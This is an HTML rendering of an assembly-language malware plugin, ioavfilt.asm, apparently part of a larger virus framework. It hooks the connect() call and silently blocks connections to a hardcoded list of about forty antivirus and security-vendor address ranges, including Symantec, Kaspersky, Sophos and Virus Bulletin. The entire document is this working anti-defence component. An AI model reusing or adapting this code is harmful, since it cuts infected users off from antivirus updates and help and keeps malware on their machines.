<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ioavfilt.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; IOAVFILT</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; - av IP blocker</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">consts.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">iohooker.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">rxio.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">plugin.inc</span><span class="sc0">
                        </span><span class="sc5">PLUGIN_START</span><span class="sc0">    </span><span class="sc5">IOAVFILT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CODE32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NON_PERMUTABLE</span><span class="sc0">

</span><span class="sc5">handleevent</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">hookevent</span><span class="sc0"> </span><span class="sc5">EV_IOHOOKER_ON_CONNECT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">onconnect</span><span class="sc0">
                        </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; output: handle event (CF==0), to fuckup connect()</span><span class="sc0">

</span><span class="sc5">onconnect</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; arg2 = sockaddr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; sin_addr</span><span class="sc0">

                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00FFFFFFh</span><span class="sc0">  </span><span class="sc1">; x.x.x.*</span><span class="sc0">

                        </span><span class="sc5">getofs</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ip_sux</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ip_sux_entries</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__fux0r</span><span class="sc0">         </span><span class="sc1">; deny access if IP found</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">stc</span><span class="sc0">     </span><span class="sc1">; normal process, keep event</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__fux0r</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">clc</span><span class="sc0">     </span><span class="sc1">; event handled --&gt; fuckup connect()</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">ip_sux</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; AV_IP.INC [15-07-00]</span><span class="sc0">
</span><span class="sc1">; taken from Vecna's srcs.</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">161</span><span class="sc4">,</span><span class="sc2">69</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; www.nai.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">167</span><span class="sc4">,</span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">243</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.fsecure.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">230</span><span class="sc4">,</span><span class="sc2">245</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.rav.ro</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">247</span><span class="sc4">,</span><span class="sc2">150</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.avp.ch</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">210</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; melona.complex.is</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">71</span><span class="sc4">,</span><span class="sc2">68</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; www.norman.no</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">242</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.ikarus.at</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">82</span><span class="sc4">,</span><span class="sc2">145</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; calgary.virusbtn.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">87</span><span class="sc4">,</span><span class="sc2">241</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.eset.sk</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">194</span><span class="sc4">,</span><span class="sc2">102</span><span class="sc4">,</span><span class="sc2">118</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; ftp0.rav.ro</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">194</span><span class="sc4">,</span><span class="sc2">108</span><span class="sc4">,</span><span class="sc2">145</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.anet.cz</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">194</span><span class="sc4">,</span><span class="sc2">135</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.dials.ru</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">194</span><span class="sc4">,</span><span class="sc2">203</span><span class="sc4">,</span><span class="sc2">134</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; s-utsire.sophos.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">194</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; www.pandasoftware.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">195</span><span class="sc4">,</span><span class="sc2">116</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; www.mks.com.pl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">195</span><span class="sc4">,</span><span class="sc2">170</span><span class="sc4">,</span><span class="sc2">248</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.kasperskylabs.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">195</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; ftp.avp.ru</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">195</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; www.avp.ru</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">198</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc4">,</span><span class="sc2">228</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.stiller.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">203</span><span class="sc4">,</span><span class="sc2">89</span><span class="sc4">,</span><span class="sc2">233</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.vet.com.au</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">205</span><span class="sc4">,</span><span class="sc2">178</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.zonelabs.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">206</span><span class="sc4">,</span><span class="sc2">204</span><span class="sc4">,</span><span class="sc2">104</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.symantec.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">206</span><span class="sc4">,</span><span class="sc2">204</span><span class="sc4">,</span><span class="sc2">212</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.symantec.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">207</span><span class="sc4">,</span><span class="sc2">188</span><span class="sc4">,</span><span class="sc2">145</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.moosoft.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">207</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.grisoft.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">207</span><span class="sc4">,</span><span class="sc2">230</span><span class="sc4">,</span><span class="sc2">123</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; quickheal.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">207</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">185</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; www.wildlist.org</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">208</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.netpro.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">208</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc2">167</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.symantec.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">208</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; abpro200.commandcom.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">209</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; www.aks.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">209</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.irisav.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">209</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.emdent.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">209</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.chekware.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">212</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.calluna.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">212</span><span class="sc4">,</span><span class="sc2">29</span><span class="sc4">,</span><span class="sc2">228</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.invircible.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">212</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">168</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.dataprot.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">122</span><span class="sc4">,</span><span class="sc2">141</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; www.avp.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">122</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; www.avp.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; antivirus.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; antivirus.com</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc4">,</span><span class="sc2">137</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; www.symantec.com</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ip_sux_entries</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ip_sux</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc5">PLUGIN_END</span><span class="sc0">
</span></div></body>
</html>
